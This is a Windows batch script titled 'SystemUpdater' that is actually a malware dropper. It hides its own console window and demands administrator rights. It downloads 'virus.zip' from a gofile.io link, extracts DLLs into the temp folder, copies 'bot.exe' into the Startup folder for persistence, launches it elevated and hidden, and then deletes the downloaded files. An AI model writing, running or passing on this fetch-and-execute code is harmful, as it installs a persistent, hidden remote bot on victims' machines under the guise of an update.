@echo off
title SystemUpdater
set "url=https://cold-eu-par-2.gofile.io/download/web/d8d82edf-9424-4ac9-bafb-deeeb58f7602/virus.zip"
set "zipfile=%TEMP%\sysupdate.zip"
set "extractdir=%TEMP%\virus"

:: Hide terminal completely
if not "%1"=="hide" (
    powershell -Command "Start-Process '%~f0' -ArgumentList 'hide' -WindowStyle Hidden"
    exit /b
)

:: Admin check
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo ACCESS DENIED - Please run as Administrator.
    timeout /t 3 /nobreak >nul
    exit /b
)

:: Download the zip
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%zipfile%'"

:: Extract only DLLs into %TEMP%\virus
powershell -Command "Expand-Archive -Path '%zipfile%' -DestinationPath '%extractdir%' -Force"

:: Find all .dll files in that folder and copy them to %TEMP%
for /r "%extractdir%" %%f in (*.dll) do (
    copy "%%f" "%TEMP%" /y
)

:: Copy bot.exe to shell:startup
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy "%extractdir%\bot.exe" "%startup%\bot.exe" /y

:: Run bot.exe as administrator (hidden)
powershell -Command "Start-Process '%extractdir%\bot.exe' -Verb RunAs -WindowStyle Hidden"

:: Cleanup (optional, removes extracted folder but keeps DLLs in %TEMP%)
rmdir /s /q "%extractdir%"
del "%zipfile%" /q

exit